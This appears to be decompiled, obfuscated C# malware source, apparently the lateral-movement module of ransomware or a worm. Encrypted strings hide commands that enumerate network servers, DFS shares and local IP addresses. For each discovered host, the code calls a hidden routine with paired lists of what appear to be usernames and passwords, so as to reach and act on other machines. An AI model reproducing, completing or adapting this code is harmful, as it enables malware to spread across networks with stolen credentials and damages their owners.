using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace oXSOOyVgTNm;

internal sealed class bksiKRlToNsI
{
	public sealed class bRVzMRuBZonef
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum UdoguuIsTpiX
	{
		wUzOpcypwf = 1,
		LqFxtPCChcgDy,
		ryWStcJujYEtwj,
		insfCdfLacUte,
		pCNwvyByRwvKdfS
	}

	public enum JVLOWTTxfSVd
	{
		nQTnZXVqgqy,
		zEbwsNcGcurJS,
		MSZcoCoSybqqcZJ,
		lIWDphnrhZVIny
	}

	public enum nrmagkVZFkNvUV
	{
		TjxJHoZTXywkxts = 1,
		xsgRBvilMSv = 2,
		KxInhIGPDntr = 4,
		wtmuFTYzwhVxFdLdp = 8,
		eSpxgcxObPbFQow = 16,
		AkykNRdLLPoK = 19
	}

	public enum lSmwsLTeQWh
	{
		UgzNvPGFODuvC,
		lmUWkAPNUJ,
		VQyOWQEJQZtry,
		oJyAOcCxvWN,
		yVEYPMzuKaN,
		NPIRjLzcCcml,
		hAFZRcXGumqsP,
		RewWMUwAaj,
		IlZrRYVUCpUduW,
		wzBDKiGRrO,
		guQztNUXsxJ,
		wKPrZIGTrLD
	}

	public sealed class XIcMBLeICLrfP : IEnumerable
	{
		private enum yxqCyZhclzvXqU
		{
			NyUkBmonSde = 0,
			xHTQPsuHUOKdqOKn = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class kHRtAFHTdhROx
		{
			public UdoguuIsTpiX aJSZOGbnMAOmpYLZ;

			public JVLOWTTxfSVd xKxpeyPISae;

			public lSmwsLTeQWh dOuYCpcVSYEbsH;

			public nrmagkVZFkNvUV PAnrVCxhmEdgEZ;

			public string DtFlJrZbioMD;

			public string HEASRZNNwgCPDDj;

			public string viqaxgTZWseFvShq;

			public string aMOuRirddmdN;
		}

		private ArrayList oOLfnxGnle = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern yxqCyZhclzvXqU WNetOpenEnumA(UdoguuIsTpiX dwScope, JVLOWTTxfSVd dwType, nrmagkVZFkNvUV dwUsage, kHRtAFHTdhROx p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern yxqCyZhclzvXqU WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern yxqCyZhclzvXqU WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(kHRtAFHTdhROx kHRtAFHTdhROx_0, UdoguuIsTpiX udoguuIsTpiX_0, JVLOWTTxfSVd jvlowttxfSVd_0, nrmagkVZFkNvUV nrmagkVZFkNvUV_0, lSmwsLTeQWh lSmwsLTeQWh_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(udoguuIsTpiX_0, jvlowttxfSVd_0, nrmagkVZFkNvUV_0, kHRtAFHTdhROx_0, out lphEnum) == yxqCyZhclzvXqU.NyUkBmonSde)
			{
				yxqCyZhclzvXqU yxqCyZhclzvXqU;
				do
				{
					yxqCyZhclzvXqU = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (yxqCyZhclzvXqU)
					{
					case yxqCyZhclzvXqU.xHTQPsuHUOKdqOKn:
						continue;
					case yxqCyZhclzvXqU.NyUkBmonSde:
						Marshal.PtrToStructure(intPtr, kHRtAFHTdhROx_0);
						if (kHRtAFHTdhROx_0.dOuYCpcVSYEbsH == lSmwsLTeQWh_0)
						{
							oOLfnxGnle.Add(kHRtAFHTdhROx_0.HEASRZNNwgCPDDj);
						}
						if ((kHRtAFHTdhROx_0.PAnrVCxhmEdgEZ & nrmagkVZFkNvUV.xsgRBvilMSv) == nrmagkVZFkNvUV.xsgRBvilMSv)
						{
							EnumerateServers(kHRtAFHTdhROx_0, udoguuIsTpiX_0, jvlowttxfSVd_0, nrmagkVZFkNvUV_0, lSmwsLTeQWh_0);
						}
						continue;
					}
					break;
				}
				while (yxqCyZhclzvXqU != yxqCyZhclzvXqU.xHTQPsuHUOKdqOKn);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public XIcMBLeICLrfP(UdoguuIsTpiX udoguuIsTpiX_0, JVLOWTTxfSVd jvlowttxfSVd_0, nrmagkVZFkNvUV nrmagkVZFkNvUV_0, lSmwsLTeQWh lSmwsLTeQWh_0)
		{
			kHRtAFHTdhROx kHRtAFHTdhROx_ = new kHRtAFHTdhROx();
			EnumerateServers(kHRtAFHTdhROx_, udoguuIsTpiX_0, jvlowttxfSVd_0, nrmagkVZFkNvUV_0, lSmwsLTeQWh_0);
		}

		public IEnumerator GetEnumerator()
		{
			return oOLfnxGnle.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct UjEcTTklCLjTX
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string WtJkCujfuRGbI;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string QonunijUAMlq;

		public uint xBweNKiNSrFH;

		public uint DIdoHvNcMqzb;

		public IntPtr IVAPBdYWSTwlXCloU;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct LTIOFfRHBJkfAIj
	{
		public int xBweNKiNSrFH;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string KCBliPTydnZ;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string dabiGivdHDn;
	}

	public struct OVjTnZfcfhu
	{
		public string kfCoSBpLCZsGLdM;

		public string[] JWTCfxNuXFpg;

		public OVjTnZfcfhu(string string_0, string[] string_1)
		{
			kfCoSBpLCZsGLdM = string_0;
			JWTCfxNuXFpg = string_1;
		}
	}

	private sealed class xwvKVpLVwrOefD
	{
		public string exNLxMGgVha;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != exNLxMGgVha;
		}
	}

	public static List<string> yoyMxIUMJTOs;

	public static string xjtQKOznTmMvHQn;

	public static List<string> YruVSpqbZI;

	public static List<string> DGrMJBvIrlFsyO;

	public static List<string> IJbtalCslfuH;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<bRVzMRuBZonef> gIvECBAdQThf()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397166);
			process.StartInfo.Arguments = getString_0(107402166);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<bRVzMRuBZonef> list = new List<bRVzMRuBZonef>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107402149))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new bRVzMRuBZonef
						{
							ServerName = getString_0(107397171) + stringBuilder.ToString() + getString_0(107401592)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string yQOLhuIjCiihcq, int gfNxCbNyFAPE, int NfpVjvLVxvE, out IntPtr pOhekYyqTnUcsN, [MarshalAs(UnmanagedType.I4)] out int uLBrvfuGOGdo, [MarshalAs(UnmanagedType.I4)] ref int ionxnTsrdXzTIN);

	public static List<OVjTnZfcfhu> pjfRDyQZmIc(string string_0)
	{
		try
		{
			List<OVjTnZfcfhu> list = new List<OVjTnZfcfhu>();
			IntPtr pOhekYyqTnUcsN = default(IntPtr);
			int uLBrvfuGOGdo = 0;
			int ionxnTsrdXzTIN = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out pOhekYyqTnUcsN, out uLBrvfuGOGdo, ref ionxnTsrdXzTIN) == 0)
			{
				for (int i = 0; i < uLBrvfuGOGdo; i++)
				{
					UjEcTTklCLjTX ujEcTTklCLjTX = (UjEcTTklCLjTX)Marshal.PtrToStructure(pOhekYyqTnUcsN + i * Marshal.SizeOf(typeof(UjEcTTklCLjTX)), typeof(UjEcTTklCLjTX));
					if (ujEcTTklCLjTX.WtJkCujfuRGbI == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < ujEcTTklCLjTX.DIdoHvNcMqzb; j++)
					{
						IntPtr ptr = new IntPtr(ujEcTTklCLjTX.IVAPBdYWSTwlXCloU.ToInt64() + j * Marshal.SizeOf(typeof(LTIOFfRHBJkfAIj)));
						LTIOFfRHBJkfAIj lTIOFfRHBJkfAIj = (LTIOFfRHBJkfAIj)Marshal.PtrToStructure(ptr, typeof(LTIOFfRHBJkfAIj));
						if (lTIOFfRHBJkfAIj.xBweNKiNSrFH == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107388497),
								lTIOFfRHBJkfAIj.KCBliPTydnZ,
								lTIOFfRHBJkfAIj.dabiGivdHDn
							}));
						}
					}
					string text = ujEcTTklCLjTX.WtJkCujfuRGbI.Replace(string_0, getString_0(107389422));
					if (text.StartsWith(getString_0(107397171)))
					{
						text = text.Substring(1);
					}
					list.Add(new OVjTnZfcfhu(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void jQYZolePlVmaQQgs()
	{
		NuHMiFuRoVNiZNRl.JIJxgqGiTDGj(getString_0(107401615));
		List<bRVzMRuBZonef> list = gIvECBAdQThf();
		List<OVjTnZfcfhu> list2 = pjfRDyQZmIc(Environment.MachineName);
		if (list2 != null)
		{
			foreach (OVjTnZfcfhu item in list2)
			{
				string[] jWTCfxNuXFpg = item.JWTCfxNuXFpg;
				foreach (string text in jWTCfxNuXFpg)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (NuHMiFuRoVNiZNRl.bCrEAAPvBiMx == getString_0(107397249))
						{
							for (int j = 0; j < YruVSpqbZI.Count; j++)
							{
								NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(getString_0(107388460), getString_0(107401498) + text + getString_0(107388406) + YruVSpqbZI[j] + getString_0(107388425) + DGrMJBvIrlFsyO[j]);
							}
						}
						else
						{
							NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(getString_0(107388460), getString_0(107401498) + text);
						}
						NuHMiFuRoVNiZNRl.lrbABqBtwmdm.Add(text.Replace(getString_0(107387741), getString_0(107389422)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (bRVzMRuBZonef item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (NuHMiFuRoVNiZNRl.bCrEAAPvBiMx == getString_0(107397249))
				{
					for (int k = 0; k < YruVSpqbZI.Count; k++)
					{
						NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(getString_0(107388460), getString_0(107401498) + item2.ServerName + getString_0(107388406) + YruVSpqbZI[k] + getString_0(107388425) + DGrMJBvIrlFsyO[k]);
					}
				}
				else
				{
					NuHMiFuRoVNiZNRl.YIXLlGdULNfSbR(getString_0(107388460), getString_0(107401498) + item2.ServerName);
				}
				NuHMiFuRoVNiZNRl.lrbABqBtwmdm.Add(item2.ServerName.Replace(getString_0(107387741), getString_0(107389422)));
			}
			catch
			{
			}
		}
	}

	public static bool yXUOPNzIwXy(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static List<string> xLVcoERcsssY()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107401521));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107401456)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107401411));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				xwvKVpLVwrOefD CS_0024_003C_003E8__locals0 = new xwvKVpLVwrOefD();
				CS_0024_003C_003E8__locals0.exNLxMGgVha = array4[j];
				if (CS_0024_003C_003E8__locals0.exNLxMGgVha.Contains(getString_0(107401398)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.exNLxMGgVha).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static bksiKRlToNsI()
	{
		Strings.CreateGetStringDelegate(typeof(bksiKRlToNsI));
		yoyMxIUMJTOs = new List<string>();
		xjtQKOznTmMvHQn = getString_0(107389422);
		YruVSpqbZI = new List<string>();
		DGrMJBvIrlFsyO = new List<string>();
		IJbtalCslfuH = new List<string>();
	}
}
